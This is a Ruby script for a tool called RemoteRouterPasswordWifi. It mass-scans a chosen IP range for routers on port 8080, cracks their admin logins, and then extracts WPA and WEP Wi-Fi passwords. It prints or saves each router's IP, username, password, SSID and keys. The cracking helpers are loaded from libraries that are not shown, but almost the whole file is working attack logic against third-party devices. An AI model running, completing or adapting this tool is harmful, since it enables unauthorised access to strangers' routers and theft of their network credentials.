require  'optparse'
require './lib/colorString'
require 'socket'
require 'net/http'
require "base64"
require 'thread'
require 'timeout'
require './lib/routerFP'
require './lib/objRpw'
require './lib/joinThread'

def setIp(tmpip,x)
	return tmpip.gsub("*",x.to_s)
end
def getOptions()
	
	OptionParser.new  do |o|
		o.banner = ""+"\nRemote router Password 0.1\n" + "Usage: example.rb [options]"
		o.on('-R Range Ip','Set Range Ip',"Example: 190.158.217.*") do |ip|
			$ipRange=ip
			
			if ($ipRange =~ /[0-9\*]+\.[0-9\*]+.[0-9\*]+.[0-9\*]+/).nil?
				puts "[-] Invalid Ip Format"
				exit();
			end
		end
		o.on('-t Number of threads',"number of Threads", ) do |step|
			
			if (step =~ /[0-9]+/).nil? || step.to_i==0
				puts "[-] Incorrect Number Of Threads"
				exit();
			end
			$nThreads=step.to_i
		  
		end
		o.on('-F ouput file') {|file| $fileOutput=file}
		o.on('-z Min-Max', 'Min Max Range Ip') do |mM|
			tmpSplit=mM.split('-')
			min=tmpSplit[0]
			max=tmpSplit[1]
			if min =~ /[0-9]+/ && max =~ /[0-9]+/ 
				$min = min.to_i
				$max = max.to_i
			end
		end
		o.on('-h', "Help"){puts o; exit}
		o.parse!
		if $ipRange.nil?
			puts o
			exit();
		end
		if $min.nil? && $max.nil?
			$min=1
			$max=255
		end
		if $fileOutput.nil?
			$fileOutput=false
		end
		if $nThreads.nil?
		    $nThreads=50;
		end
	end
	
end



def vipRange()
	puts "[+] #{$ipRange.gsub("*","(#{$min}-#{$max})")}"
end
def barnner()
	puts "     \t[------- RemoteRouterPasswordWifi ----------]"
	puts "     \t[---------------- s0c5 ---------------------]\n\n"
    
end


getOptions();
barnner();
vipRange();
puts "[+] total ip Scanned: #{$max-($min-1)}"

routers=[]
routersCrack=[]
threads=[]





for i in (1..255)
	threads << Thread.new(setIp($ipRange,i)) do |ipTmp|
		tmp=Rpw.new(ipTmp,8080)
		if tmp.active
			routers << tmp
		end
	end
	if threads.size!=0 && threads.size%$nThreads==0
		threads=joinThread(threads)
		per=(i*100.0/($max-$min)).round(1)
		puts "[+] Last ip: #{setIp($ipRange,i)}\t #{per>100?100: per}%"
		
	  
	end
	      
end
threads=joinThread(threads)
puts "[+] ip Found: #{routers.size}"
puts "[+] Router Cracker init ..."

c=1;
routers.each do |router|
	threads << Thread.new(router) do |routerTmp|
		ret=routerTmp.crack()
		if  ret != false
			routerTmp.detect(ret[:response].body)
			if routerTmp.routerType==:cisco
				ret2=routerTmp.crack("/wlanBasic.asp");
				if ret2 != false
					routersCrack << routerTmp
				end
			else
				routersCrack << routerTmp
			end
		end
	end
	if threads.size != 0 && threads.size % $nThreads == 0
		per=(c*100.0/routers.size).round(1)
		puts "[+] Last Router cracked: #{router.ip}\t #{per>100?100: per}%"
		threads=joinThread(threads)
		
	end
	
	c.next
end
threads=joinThread(threads)
puts "[+] Routers Cracked: #{routersCrack.size}"
routersCrack.each do |router|
	puts "[++] Router crack: ip=#{router.ip}\ttype=#{router.routerType.nil? ? "" : router.routerType[0..6]}\tuser=#{router.user}\tpasswd=#{router.passwd}"
end
c=1
puts "[+] Geetting WPA,WEP from routers.."
routersCrack.each do |router|
	threads << Thread.new(router) do |routerTmp|
		  if !routerTmp.routerType.nil?
			routerTmp.getSW(["WPA","WEP"])
		  end
		  
	end
	if threads.size != 0 && threads.size % $nThreads == 0
		per=(c*100.0/routersCrack.size).round(1)
		puts "[+] Getting Password wifi: #{router.ip}\t #{per>100?100: per}%"
		threads=joinThread(threads)
	end
	c.next
end
threads=joinThread(threads)
puts "[+] password getting: "

routersCrack.each do |router|
	if !router.routerType.nil?
		puts "[+] Router #{router.routerType[0..5]}: ip=#{router.ip}\tssid=#{router.ssid}\tWPA=#{router.wifiPassword[:WPA].nil? ? " "*20 : router.wifiPassword[:WPA]}\t WEP=#{router.wifiPassword[:WEP]}"
	end
	if $fileOutput!=false
		File.open($fileOutput,"a+").puts "[*] IP: #{router.ip}\t ssid: #{router.ssid}\t WPA: #{router.wifiPassword[:WPA].nil? ? " "*20 : router.wifiPassword[:WPA]}\t WEP: #{router.wifiPassword[:WEP]}"
	end
end